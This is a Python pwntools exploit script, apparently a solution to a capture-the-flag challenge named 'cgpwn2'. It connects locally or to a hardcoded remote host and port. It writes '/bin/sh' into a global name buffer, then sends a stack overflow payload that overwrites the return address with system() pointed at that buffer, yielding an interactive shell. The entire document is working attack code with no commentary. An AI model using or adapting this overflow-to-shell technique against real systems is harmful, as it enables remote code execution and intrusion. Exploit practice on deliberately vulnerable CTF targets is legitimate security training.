from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./cgpwn2")
else:
	p = remote("111.198.29.45",31929)

system_addr = 0x08048420
name_addr = 0x0804A080
p.sendlineafter("please tell me your name\n","/bin/sh")
payload = "a"*0x26 + "junk" + p32(system_addr) + "junk" + p32(name_addr)
p.sendlineafter("hello,you can leave some message here:\n",payload)
p.interactive()
